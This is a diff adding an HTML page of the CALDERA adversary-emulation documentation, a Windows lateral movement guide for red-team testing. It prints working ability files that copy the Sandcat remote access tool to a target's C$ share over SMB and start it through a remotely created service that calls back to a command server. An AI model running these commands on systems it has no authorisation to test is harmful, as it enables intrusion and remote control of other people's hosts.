@@ -1,0 +1,450 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Windows Lateral Movement Guide &mdash; caldera  documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
+        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+        <script src="_static/jquery.js"></script>
+        <script src="_static/underscore.js"></script>
+        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Dynamically-Compiled Payloads" href="Dynamically-Compiled-Payloads.html" />
+    <link rel="prev" title="Initial Access Attacks" href="Initial-Access-Attacks.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="index.html">
+          
+
+          
+            
+            <img src="_static/caldera-logo.png" class="logo" alt="Logo"/>
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption" role="heading"><span class="caption-text">Usage Guides</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="Installing-CALDERA.html">Installing CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Getting-started.html">Getting started</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Learning-the-terminology.html">Learning the terminology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Basic-Usage.html">Basic Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Server-Configuration.html">Server Configuration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Plugin-library.html">Plugin library</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Parsers.html">Parsers</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Relationships.html">Relationships</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Requirements.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Objectives.html">Objectives</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Operation-Results.html">Operation Results</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Initial-Access-Attacks.html">Initial Access Attacks</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Windows Lateral Movement Guide</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#setup">Setup</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#firewall-exceptions-and-enabling-file-and-printer-sharing">Firewall Exceptions and Enabling File and Printer Sharing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#user-with-administrative-privileges">User with Administrative Privileges</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#additional-considerations">Additional Considerations</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#lateral-movement-using-caldera">Lateral Movement Using CALDERA</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#moving-the-binary">Moving the Binary</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#execution-of-the-binary">Execution of the Binary</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#displaying-lateral-movement-in-debrief">Displaying Lateral Movement in Debrief</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#example-lateral-movement-profile">Example Lateral Movement Profile</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#ability-files-used">Ability Files Used</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamically-Compiled-Payloads.html">Dynamically-Compiled Payloads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Exfiltration.html">Exfiltration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Sandcat-Peer-to-Peer.html">Peer-to-Peer Proxy Functionality for Sandcat Agents</a></li>
+<li class="toctree-l1"><a class="reference internal" href="C2-Tunneling.html">C2 Communications Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Uninstalling-CALDERA.html">Uninstall CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Troubleshooting.html">Troubleshooting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="resources.html">Resources</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Plugin Documentation</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="plugins/sandcat/Sandcat-Details.html">Sandcat Plugin Details</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html">Exfiltration Scenarios and Setup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#an-example">An Example</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#wrap-up">Wrap-up</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Developer Information</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="The-REST-API.html">The REST API</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Plugins.html">How to Build Plugins</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Planners.html">How to Build Planners</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Agents.html">How to Build Agents</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Core System API</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="_generated/modules.html">app</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">caldera</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="index.html">Docs</a> &raquo;</li>
+        
+      <li>Windows Lateral Movement Guide</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="_sources/Lateral-Movement-Guide.md.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="windows-lateral-movement-guide">
+<h1>Windows Lateral Movement Guide<a class="headerlink" href="#windows-lateral-movement-guide" title="Permalink to this heading">¶</a></h1>
+<p>Exercising Caldera’s lateral movement and remote execution abilities allows you to test how easily an adversary can move
+within your network. This guide will walk you through some of the necessary setup steps to get started with testing
+lateral movement in a Windows environment.</p>
+<div class="section" id="setup">
+<h2>Setup<a class="headerlink" href="#setup" title="Permalink to this heading">¶</a></h2>
+<div class="section" id="firewall-exceptions-and-enabling-file-and-printer-sharing">
+<h3>Firewall Exceptions and Enabling File and Printer Sharing<a class="headerlink" href="#firewall-exceptions-and-enabling-file-and-printer-sharing" title="Permalink to this heading">¶</a></h3>
+<p>The firewall of the target host should not be blocking UDP ports 137 and 138 and TCP ports 139 and 445. The firewall
+should also allow inbound file and printer sharing.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="nb">set</span> <span class="n">rule</span> <span class="n">group</span><span class="o">=</span><span class="s2">&quot;File and Printer Sharing&quot;</span> <span class="n">new</span> <span class="n">enable</span><span class="o">=</span><span class="n">Yes</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="user-with-administrative-privileges">
+<h3>User with Administrative Privileges<a class="headerlink" href="#user-with-administrative-privileges" title="Permalink to this heading">¶</a></h3>
+<p>This guide will assume a user <em>with administrative privileges to the target host</em> has been compromised and that a CALDERA
+agent has been spawned with this user’s privileges. Some methods of lateral movement may depend on whether (1) the user
+has administrative privileges but is not a domain account or (2) the user has administrative privileges and is a domain
+account. The example walkthrough in this guide should not be impacted by these distinctions.</p>
+</div>
+<div class="section" id="additional-considerations">
+<h3>Additional Considerations<a class="headerlink" href="#additional-considerations" title="Permalink to this heading">¶</a></h3>
+<ol class="arabic simple">
+<li><p>Ensure GPO/SRP or antivirus is not blocking remote access to shares.</p></li>
+<li><p>Ensure at least ADMIN$, C$, and IPC$ shares exist on the target host.</p></li>
+</ol>
+</div>
+</div>
+<div class="section" id="lateral-movement-using-caldera">
+<h2>Lateral Movement Using CALDERA<a class="headerlink" href="#lateral-movement-using-caldera" title="Permalink to this heading">¶</a></h2>
+<p>Lateral movement can be a combination of two steps. The first requires confirmation of remote access to the next target
+host and the movement or upload of the remote access tool (RAT) executable to the host. The second part requires
+<em>execution</em> of the binary, which upon callback of the RAT on the new host would complete the lateral movement.</p>
+<p>Most of CALDERA’s lateral movement and execution abilities found in Stockpile have fact or relationship requirements
+that must be satisfied. This information may be passed to the operation in two ways:</p>
+<ol class="arabic simple">
+<li><p>The fact and relationship information may be added to an operation’s source. A new source can be created or this
+information can be added to an already existing source as long as that source is used by the operation. When configuring
+an operation, open the “<strong>AUTONOMOUS</strong>” drop down section and select “Use [insert source name] facts” to indicate to the
+operation that it should take in fact and relationship information from the selected source.</p></li>
+<li><p>The fact and relationship information can be discovered by an operation. This requires additional abilities to be run
+prior to the lateral movement and execution abilities to collect the necessary fact and relationship information
+necessary to satisfy the ability requirements.</p></li>
+</ol>
+<div class="section" id="moving-the-binary">
+<h3>Moving the Binary<a class="headerlink" href="#moving-the-binary" title="Permalink to this heading">¶</a></h3>
+<p>There are several ways a binary can be moved or uploaded from one host to another. Some example methods used in
+CALDERA’s lateral movement abilities include:</p>
+<ol class="arabic simple">
+<li><p>WinRM</p></li>
+<li><p>SCP</p></li>
+<li><p>wmic</p></li>
+<li><p>SMB</p></li>
+<li><p>psexec</p></li>
+</ol>
+<p>Based on the tool used, additional permissions may need to be changed in order for users to conduct these actions
+remotely.</p>
+</div>
+<div class="section" id="execution-of-the-binary">
+<h3>Execution of the Binary<a class="headerlink" href="#execution-of-the-binary" title="Permalink to this heading">¶</a></h3>
+<p>CALDERA’s Stockpile execution abilities relevant to lateral movement mainly use wmic to remotely start the binary. Some
+additional execution methods include modifications to Windows services and scheduled tasks. The example in this guide
+will use the creation of a service to remotely start the binary (ability file included at the end of this guide).</p>
+<p>See ATT&amp;CK’s <a class="reference external" href="https://attack.mitre.org/tactics/TA0002/">Execution</a> tactic page for more details on execution methods.</p>
+</div>
+<div class="section" id="displaying-lateral-movement-in-debrief">
+<h3>Displaying Lateral Movement in Debrief<a class="headerlink" href="#displaying-lateral-movement-in-debrief" title="Permalink to this heading">¶</a></h3>
+<p>Using the adversary profile in this guide and CALDERA’s Debrief plugin, you can view the path an adversary took through
+the network via lateral movement attempts. In the Debrief modal, select the operation where lateral movement was
+attempted then select the Attack Path view from the upper right hand corner of graph views. This graph displays the
+originating C2 server and agent nodes connected by the execution command linking the originating agent to the newly
+spawned agent.</p>
+<p>In the example attack path graph below, the Service Creation Lateral Movement adversary profile was run on the <code class="docutils literal notranslate"><span class="pre">win10</span></code>
+host, which moved laterally to the <code class="docutils literal notranslate"><span class="pre">VAGRANTDC</span></code> machine via successful execution of the Service Creation ability.</p>
+<p><img alt="Debrief Attack Path Example" src="_images/debrief_attack_path.png" /></p>
+<p>This capability relies on the <code class="docutils literal notranslate"><span class="pre">origin_link_id</span></code> field to be populated within the agent profile upon first
+check-in and is currently implemented for the default agent, Sandcat. For more information about the <code class="docutils literal notranslate"><span class="pre">#{origin_link_id}</span></code>
+global variable, see the explanation of <strong>Command</strong> in the <a class="reference internal" href="Basic-Usage.html#abilities"><span class="std std-doc">Abilities</span></a>
+section of the Basic Usage guide. For more information about how lateral movement tracking is implemented
+in agents to be used with CALDERA, see the <a class="reference internal" href="How-to-Build-Agents.html#lateral-movement-tracking"><span class="std std-doc">Lateral Movement Tracking</span></a>
+section of the How to Build Agents guide.</p>
+</div>
+</div>
+<div class="section" id="example-lateral-movement-profile">
+<h2>Example Lateral Movement Profile<a class="headerlink" href="#example-lateral-movement-profile" title="Permalink to this heading">¶</a></h2>
+<p>This section will walkthrough the necessary steps for proper execution of the Service Creation Lateral Movement
+adversary profile. This section will assume successful setup from the previous sections mentioned in this guide and that
+a Sandcat agent has been spawned with administrative privileges to the remote target host. The full ability files used
+in this adversary profile are included at the end of this guide.</p>
+<ol class="arabic simple">
+<li><p>Go to <code class="docutils literal notranslate"><span class="pre">navigate</span></code> pane &gt; <code class="docutils literal notranslate"><span class="pre">Advanced</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">sources</span></code>. This should open a new sources modal in the web GUI.</p></li>
+<li><p>Click the toggle to create a new source. Enter “SC Source” as the source name. Then enter <code class="docutils literal notranslate"><span class="pre">remote.host.fqdn</span></code> as the
+fact name and the FQDN of the target host you are looking to move laterally to as the fact value. Click <code class="docutils literal notranslate"><span class="pre">Save</span></code> once
+source configuration has been completed.</p></li>
+<li><p>Go to <code class="docutils literal notranslate"><span class="pre">navigate</span></code> pane &gt; <code class="docutils literal notranslate"><span class="pre">Campaigns</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">operations</span></code>. Click the toggle to create a new operation. Under
+<code class="docutils literal notranslate"><span class="pre">BASIC</span> <span class="pre">OPTIONS</span></code> select the group with the relevant agent and the Service Creation Lateral Movement profile. Under
+<code class="docutils literal notranslate"><span class="pre">AUTONOMOUS</span></code>, select <code class="docutils literal notranslate"><span class="pre">Use</span> <span class="pre">SC</span> <span class="pre">Source</span> <span class="pre">facts</span></code>. If the source created from the previous step is not available in the
+drop down, try refreshing the page.</p></li>
+<li><p>Once operation configurations have been completed, click <code class="docutils literal notranslate"><span class="pre">Start</span></code> to start the operation.</p></li>
+<li><p>Check the agents list for a new agent on the target host.</p></li>
+</ol>
+<div class="section" id="ability-files-used">
+<h3>Ability Files Used<a class="headerlink" href="#ability-files-used" title="Permalink to this heading">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span> <span class="nb">id</span><span class="p">:</span> <span class="n">deeac480</span><span class="o">-</span><span class="mi">5</span><span class="n">c2a</span><span class="o">-</span><span class="mi">42</span><span class="n">b5</span><span class="o">-</span><span class="mi">90</span><span class="n">bb</span><span class="o">-</span><span class="mi">41675</span><span class="n">ee53c7e</span>
+  <span class="n">name</span><span class="p">:</span> <span class="n">View</span> <span class="n">remote</span> <span class="n">shares</span>
+  <span class="n">description</span><span class="p">:</span> <span class="n">View</span> <span class="n">the</span> <span class="n">shares</span> <span class="n">of</span> <span class="n">a</span> <span class="n">remote</span> <span class="n">host</span>
+  <span class="n">tactic</span><span class="p">:</span> <span class="n">discovery</span>
+  <span class="n">technique</span><span class="p">:</span>
+    <span class="n">attack_id</span><span class="p">:</span> <span class="n">T1135</span>
+    <span class="n">name</span><span class="p">:</span> <span class="n">Network</span> <span class="n">Share</span> <span class="n">Discovery</span>
+  <span class="n">platforms</span><span class="p">:</span>
+    <span class="n">windows</span><span class="p">:</span>
+      <span class="n">psh</span><span class="p">:</span>
+        <span class="n">command</span><span class="p">:</span> <span class="n">net</span> <span class="n">view</span> \\<span class="c1">#{remote.host.fqdn} /all</span>
+        <span class="n">parsers</span><span class="p">:</span>
+          <span class="n">plugins</span><span class="o">.</span><span class="n">stockpile</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">parsers</span><span class="o">.</span><span class="n">net_view</span><span class="p">:</span>
+          <span class="o">-</span> <span class="n">source</span><span class="p">:</span> <span class="n">remote</span><span class="o">.</span><span class="n">host</span><span class="o">.</span><span class="n">fqdn</span>
+            <span class="n">edge</span><span class="p">:</span> <span class="n">has_share</span>
+            <span class="n">target</span><span class="p">:</span> <span class="n">remote</span><span class="o">.</span><span class="n">host</span><span class="o">.</span><span class="n">share</span>
+      <span class="n">cmd</span><span class="p">:</span>
+        <span class="n">command</span><span class="p">:</span> <span class="n">net</span> <span class="n">view</span> \\<span class="c1">#{remote.host.fqdn} /all</span>
+        <span class="n">parsers</span><span class="p">:</span>
+          <span class="n">plugins</span><span class="o">.</span><span class="n">stockpile</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">parsers</span><span class="o">.</span><span class="n">net_view</span><span class="p">:</span>
+          <span class="o">-</span> <span class="n">source</span><span class="p">:</span> <span class="n">remote</span><span class="o">.</span><span class="n">host</span><span class="o">.</span><span class="n">fqdn</span>
+            <span class="n">edge</span><span class="p">:</span> <span class="n">has_share</span>
+            <span class="n">target</span><span class="p">:</span> <span class="n">remote</span><span class="o">.</span><span class="n">host</span><span class="o">.</span><span class="n">share</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>- id: 65048ec1-f7ca-49d3-9410-10813e472b30
+  name: Copy Sandcat (SMB)
+  description: Copy Sandcat to remote host (SMB)
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: &quot;Remote Services: SMB/Windows Admin Shares&quot;
+  platforms:
+    windows:
+      psh:
+        command: |
+          $path = &quot;sandcat.go-windows&quot;;
+          $drive = &quot;\\#{remote.host.fqdn}\C$&quot;;
+          Copy-Item -v -Path $path -Destination $drive&quot;\Users\Public\s4ndc4t.exe&quot;;
+        cleanup: |
+          $drive = &quot;\\#{remote.host.fqdn}\C$&quot;;
+          Remove-Item -Path $drive&quot;\Users\Public\s4ndc4t.exe&quot; -Force;
+        parsers:
+          plugins.stockpile.app.parsers.54ndc47_remote_copy:
+          - source: remote.host.fqdn
+            edge: has_54ndc47_copy
+        payloads:
+        - sandcat.go-windows
+  requirements:
+  - plugins.stockpile.app.requirements.not_exists:
+    - source: remote.host.fqdn
+      edge: has_54ndc47_copy
+  - plugins.stockpile.app.requirements.basic:
+    - source: remote.host.fqdn
+      edge: has_share
+  - plugins.stockpile.app.requirements.no_backwards_movement:
+    - source: remote.host.fqdn
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span> <span class="nb">id</span><span class="p">:</span> <span class="mi">95727</span><span class="n">b87</span><span class="o">-</span><span class="mi">175</span><span class="n">c</span><span class="o">-</span><span class="mi">4</span><span class="n">a69</span><span class="o">-</span><span class="mi">8</span><span class="n">c7a</span><span class="o">-</span><span class="n">a5d82746a753</span>
+  <span class="n">name</span><span class="p">:</span> <span class="n">Service</span> <span class="n">Creation</span>
+  <span class="n">description</span><span class="p">:</span> <span class="n">Create</span> <span class="n">a</span> <span class="n">service</span> <span class="n">named</span> <span class="s2">&quot;sandsvc&quot;</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">remote</span> <span class="n">Sandcat</span> <span class="n">binary</span> <span class="n">named</span> <span class="s2">&quot;s4ndc4t.exe&quot;</span>
+  <span class="n">tactic</span><span class="p">:</span> <span class="n">execution</span>
+  <span class="n">technique</span><span class="p">:</span>
+    <span class="n">attack_id</span><span class="p">:</span> <span class="n">T1569</span><span class="mf">.002</span>
+    <span class="n">name</span><span class="p">:</span> <span class="s1">&#39;System Services: Service Execution&#39;</span>
+  <span class="n">platforms</span><span class="p">:</span>
+    <span class="n">windows</span><span class="p">:</span>
+      <span class="n">psh</span><span class="p">:</span>
+        <span class="n">timeout</span><span class="p">:</span> <span class="mi">300</span>
+        <span class="n">cleanup</span><span class="p">:</span> <span class="o">|</span>
+          <span class="n">sc</span><span class="o">.</span><span class="n">exe</span> \\<span class="c1">#{remote.host.fqdn} stop sandsvc;</span>
+          <span class="n">sc</span><span class="o">.</span><span class="n">exe</span> \\<span class="c1">#{remote.host.fqdn} delete sandsvc /f;</span>
+          <span class="n">taskkill</span> <span class="o">/</span><span class="n">s</span> \\<span class="c1">#{remote.host.fqdn} /FI &quot;Imagename eq s4ndc4t.exe&quot;</span>
+        <span class="n">command</span><span class="p">:</span> <span class="o">|</span>
+          <span class="n">sc</span><span class="o">.</span><span class="n">exe</span> \\<span class="c1">#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= &quot;cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}&quot; displayname= &quot;Sandcat Execution&quot;;</span>
+          <span class="n">sc</span><span class="o">.</span><span class="n">exe</span> \\<span class="c1">#{remote.host.fqdn} start sandsvc;</span>
+          <span class="n">Start</span><span class="o">-</span><span class="n">Sleep</span> <span class="o">-</span><span class="n">s</span> <span class="mi">15</span><span class="p">;</span>
+          <span class="n">Get</span><span class="o">-</span><span class="n">Process</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="c1">#{remote.host.fqdn} s4ndc4t;</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="Dynamically-Compiled-Payloads.html" class="btn btn-neutral float-right" title="Dynamically-Compiled Payloads" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="Initial-Access-Attacks.html" class="btn btn-neutral float-left" title="Initial Access Attacks" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2023, The MITRE Corporation
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
